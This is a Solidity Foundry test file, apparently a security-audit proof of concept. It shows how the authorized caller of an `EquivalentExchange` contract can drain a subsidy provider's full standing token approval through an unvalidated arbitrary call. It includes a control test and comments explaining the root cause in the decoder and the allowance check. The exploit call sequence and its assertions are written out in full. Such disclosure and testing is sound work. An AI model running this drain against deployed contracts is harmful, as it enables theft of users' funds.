// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import { EquivalentExchange } from "src/helper/equivalent-exchange/EquivalentExchange.sol";
import { ERC20 } from "@solmate/tokens/ERC20.sol";
import { Authority } from "@solmate/auth/Auth.sol";
import { Test } from "@forge-std/Test.sol";

/// @notice Minimal ERC20 for the PoC (mirrors the `tERC20` used in EquivalentExchange.t.sol).
contract tERC20 is ERC20 {

    constructor(uint8 _decimals) ERC20("test token", "TT", _decimals) { }

}

/**
 * @title EquivalentExchange subsidy-provider drain PoC
 *
 * @notice Demonstrates that the sole authorized caller of `EquivalentExchange.execute` (the BoringVault,
 *         per DeployEquivalentExchange.s.sol) can drain the ENTIRE standing approval of a subsidy provider
 *         to an arbitrary address, far beyond any swap shortfall.
 *
 * Why this is reachable in production:
 *   - EquivalentExchange is owned by, and only callable by, the BoringVault. The vault reaches it through a
 *     merkle leaf via PxlDecoderAndSanitizer.execute.
 *   - That decoder (src/base/DecodersAndSanitizers/Protocols/PxlDecoderAndSanitizer.sol:228-246) packs ONLY
 *     `tokens[]`, `subsidyPayer`, and `subsidyToken` into the merkle-gated `addressesFound`. The
 *     `amountsIn`, `targets`, and `targetData` arguments are unnamed and excluded, so the merkle tree does
 *     NOT constrain the arbitrary call route at all.
 *   - EquivalentExchange.execute then runs `targets[i].functionCall(targetData[i])` with no whitelist
 *     (EquivalentExchange.sol:107-109).
 *   - The `_pull` dangling-approval check (EquivalentExchange.sol:154) only inspects the CALLER's (vault's)
 *     allowance, never the subsidy provider's standing approval.
 *
 * Because this test's `owner` is the authorized caller, it is a faithful stand-in for the vault: the merkle
 * path adds no restriction on `targets`/`targetData`/`amountsIn`, so anything `owner` can pass here, a
 * strategist can pass through a legitimate `execute` leaf in production.
 *
 * Precondition (the one deployment fact that makes this exploitable): the subsidy provider holds a standing
 * approval to the exchange. The subsidy feature requires it — a separate provider cannot approve atomically
 * inside the vault's single `execute` call — and the project's own integration test sets exactly such a
 * standing approval (`_setupSubsidyProvider`).
 */
contract EquivalentExchangeSubsidyDrainPoC is Test {

    EquivalentExchange internal exchange;

    // `owner` is the authorized caller == the BoringVault in production.
    address internal owner = makeAddr("boringVault");
    address internal subsidyProvider = makeAddr("subsidyProvider");
    address internal attacker = makeAddr("attacker");

    function setUp() external {
        exchange = new EquivalentExchange(owner, Authority(address(0)));
    }

    function test_PoC_StrategistDrainsSubsidyProviderStandingApproval() external {
        tERC20 token = new tERC20(6); // e.g. USDT

        uint256 providerBalance = 1_000_000e6; // provider's full treasury
        deal(address(token), subsidyProvider, providerBalance);

        // The subsidy provider maintains a standing (here: max) approval so subsidies can be pulled on
        // demand across many rebalances. This is the production pattern the subsidy feature needs.
        vm.prank(subsidyProvider);
        token.approve(address(exchange), type(uint256).max);

        // --- The malicious `execute` call the vault is driven to make ---
        // tokens[]/subsidyPayer/subsidyToken match a legitimate subsidized-swap leaf; amountsIn/targets/
        // targetData are NOT gated by the decoder, so the attacker fills them freely.
        ERC20[] memory tokens = new ERC20[](1);
        uint256[] memory amountsIn = new uint256[](1);
        address[] memory targets = new address[](1);
        bytes[] memory targetData = new bytes[](1);

        tokens[0] = ERC20(address(token)); // a legitimate basket/subsidy token
        amountsIn[0] = 0; // pull nothing -> totalIn == 0, so the value invariant is trivially satisfied

        // The un-gated arbitrary call: make the exchange spend the provider's standing approval.
        targets[0] = address(token);
        targetData[0] =
            abi.encodeWithSelector(ERC20.transferFrom.selector, subsidyProvider, attacker, providerBalance);

        // Sanity: before the attack.
        assertEq(token.balanceOf(subsidyProvider), providerBalance, "provider funded");
        assertEq(token.balanceOf(attacker), 0, "attacker empty");

        // The vault (owner) executes. subsidyPayer/subsidyToken are the real provider/token, as a legit leaf
        // would pin them. The call does NOT revert: totalIn == 0, totalOut == 0, invariant holds.
        vm.prank(owner);
        exchange.execute(tokens, amountsIn, targets, targetData, subsidyProvider, ERC20(address(token)));

        // --- Impact: the provider's entire balance is now the attacker's, with zero cost. ---
        assertEq(token.balanceOf(subsidyProvider), 0, "subsidy provider fully drained");
        assertEq(token.balanceOf(attacker), providerBalance, "attacker received the whole treasury");
        assertEq(token.balanceOf(address(exchange)), 0, "exchange holds nothing (pure pass-through)");
    }

    /// @notice Control: with NO standing third-party approval, the arbitrary call cannot steal. Diverting
    ///         the vault's own pulled funds instead makes `_sweep` short and trips the output>=input
    ///         invariant, reverting the whole batch. This isolates the standing approval as the precondition.
    function test_PoC_NoStandingApproval_InvariantProtectsCaller() external {
        tERC20 token = new tERC20(6);

        uint256 amount = 1000e6;
        deal(address(token), owner, amount);

        ERC20[] memory tokens = new ERC20[](1);
        uint256[] memory amountsIn = new uint256[](1);
        address[] memory targets = new address[](1);
        bytes[] memory targetData = new bytes[](1);

        tokens[0] = ERC20(address(token));
        amountsIn[0] = amount; // vault really pulls value in

        // Attacker tries to divert the pulled tokens the exchange now holds.
        targets[0] = address(token);
        targetData[0] = abi.encodeWithSelector(ERC20.transfer.selector, attacker, amount);

        vm.startPrank(owner);
        token.approve(address(exchange), amount);
        // No subsidy provider / approval exists to cover the manufactured shortfall, so execute reverts.
        vm.expectRevert();
        exchange.execute(tokens, amountsIn, targets, targetData, address(0), ERC20(address(0)));
        vm.stopPrank();
    }

}
